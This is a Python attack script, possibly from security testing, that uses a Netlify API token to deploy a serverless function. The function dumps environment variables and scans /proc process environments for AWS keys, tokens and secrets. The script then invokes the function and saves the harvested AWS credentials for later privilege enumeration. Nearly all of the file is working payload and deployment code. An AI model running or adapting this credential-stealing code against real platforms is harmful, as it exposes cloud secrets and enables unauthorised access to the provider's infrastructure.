# -*- coding: utf-8 -*-
"""NL4: probeAWS - redeploy function dump (env incl AWS creds + /proc scan) to site B, invoke, save output
Goal: refresh expired 9/2 credentials, then local boto3 privilege enumeration (unfinished surface)"""
import http.client, ssl, json, sys, time, hashlib, zipfile, io, os, urllib.request
sys.path.insert(0, r'F:\scan\netlify_report')
from _net_creds import TOKEN_A

SITE = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
BASE_DIR = r'F:\scan\netlify_report'
ctx = ssl.create_default_context()

FN_JS = r"""
const fs = require('fs');
const read = (p, max = 4000) => {
  try { return fs.readFileSync(p).toString('utf8', 0, max).replace(/\0/g, '|'); }
  catch (e) { return 'ERR ' + String(e).slice(0, 80); }
};
const ls = (p) => {
  try { return fs.readdirSync(p, { withFileTypes: true }).map(e => e.name).join(','); }
  catch (e) { return 'ERR'; }
};
exports.handler = async () => {
  const out = {};
  out.env = process.env;
  out.procs = {};
  try {
    const names = fs.readdirSync('/proc');
    for (const n of names) {
      if (!/^\d+$/.test(n)) continue;
      const cmd = read('/proc/' + n + '/cmdline', 400);
      if (cmd.startsWith('ERR') && !cmd.includes('ENOENT')) continue;
      out.procs[n] = { cmd: cmd.slice(0, 300) };
      const env = read('/proc/' + n + '/environ', 2500);
      if (env && !env.startsWith('ERR') && (env.includes('AWS') || env.includes('KEY') || env.includes('TOKEN') || env.includes('SECRET'))) {
        out.procs[n].env = env.slice(0, 2500);
      }
    }
  } catch (e) { out.procs.err = String(e); }
  out.fs = {
    opt: ls('/opt'),
    varTask: ls('/var/task'),
    tmp: ls('/tmp'),
    root: ls('/'),
  };
  return { statusCode: 200, body: JSON.stringify(out) };
};
"""

HTML = b'<html><body>awsprobe</body></html>'


def api(path, method='GET', body=None, raw_body=None, ctype='application/json', qs='', token=TOKEN_A):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=40)
    h = {'User-Agent': 'netlify-cli/17.0.0 (node v24)', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + token, 'Content-Type': ctype}
    payload = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path + qs, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    conn.close()
    return st, raw


def main():
    print("== NL4 probeAWS deploy ==", flush=True)
    # build zip: function dir probeAWS/index.js at zip root
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('index.js', FN_JS)
    fzip = bio.getvalue()
    open(os.path.join(BASE_DIR, '_nl4_probeAWS.zip'), 'wb').write(fzip)
    print('zip bytes:', len(fzip), flush=True)

    files = {'/index.html': hashlib.sha1(HTML).hexdigest()}
    functions = {'probeAWS': hashlib.sha256(fzip).hexdigest()}
    body = {'title': 'fn-nl4', 'files': files, 'functions': functions}
    s, raw = api('/api/v1/sites/%s/deploys' % SITE, method='POST', body=body)
    print('create deploy:', s, raw[:200].decode('utf-8', 'replace'), flush=True)
    if s != 200:
        return
    d = json.loads(raw)
    DID = d.get('id')
    print('DID:', DID, flush=True)

    s, raw = api('/api/v1/deploys/%s/files/index.html' % DID, method='PUT', raw_body=HTML,
                 ctype='application/octet-stream', qs='?size=%d' % len(HTML))
    print('put html:', s, flush=True)

    for i in range(40):
        s3, raw3 = api('/api/v1/deploys/%s' % DID)
        try:
            st3 = json.loads(raw3).get('state')
        except Exception:
            st3 = None
        print('poll %d: %s' % (i, st3), flush=True)
        if st3 in ('processed', 'ready'):
            break
        time.sleep(1)
    for i in range(12):
        s2, raw2 = api('/api/v1/deploys/%s/functions/probeAWS' % DID, method='PUT', raw_body=fzip,
                       ctype='application/zip', qs='?runtime=js&size=%d' % len(fzip))
        print('PUT fn %d: %d %s' % (i, s2, raw2[:100].decode('utf-8', 'replace').replace('\n', ' ')), flush=True)
        if s2 == 200:
            break
        time.sleep(1)
    s4, raw4 = api('/api/v1/deploys/%s' % DID)
    print('before publish state:', json.loads(raw4).get('state'), flush=True)
    s5, raw5 = api('/api/v1/sites/%s/deploys/%s' % (SITE, DID), method='POST')
    print('publish:', s5, raw5[:150].decode('utf-8', 'replace'), flush=True)
    time.sleep(4)
    # invoke
    url = 'https://sec-test-rcf6lz.netlify.app/.netlify/functions/probeAWS'
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            data = r.read().decode('utf-8', 'replace')
        open(os.path.join(BASE_DIR, '_nl4_out.json'), 'w', encoding='utf-8').write(data)
        print('invoke OK len', len(data), flush=True)
        d = json.loads(data)
        env = d.get('env', {})
        print('env keys:', sorted(env.keys()), flush=True)
        for k in ('AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AWS_LAMBDA_FUNCTION_NAME',
                  'AWS_ACCOUNT_ID', 'AWS_REGION'):
            v = env.get(k, '')
            print('  %s = %s' % (k, v[:60]), flush=True)
        if env.get('AWS_ACCESS_KEY_ID') and env.get('AWS_SECRET_ACCESS_KEY'):
            creds = {'access_key': env['AWS_ACCESS_KEY_ID'], 'secret_key': env['AWS_SECRET_ACCESS_KEY'],
                     'session_token': env.get('AWS_SESSION_TOKEN', ''),
                     'region': env.get('AWS_REGION', 'us-east-2'), 'source': 'nl4-probeAWS-env'}
            json.dump(creds, open(os.path.join(BASE_DIR, '_nl4_creds.json'), 'w'), indent=1)
            print('creds saved', flush=True)
        print('procs:', json.dumps(d.get('procs', {}), ensure_ascii=False)[:800], flush=True)
    except Exception as e:
        print('invoke ERR:', e, flush=True)
    print("done", flush=True)


if __name__ == "__main__":
    main()
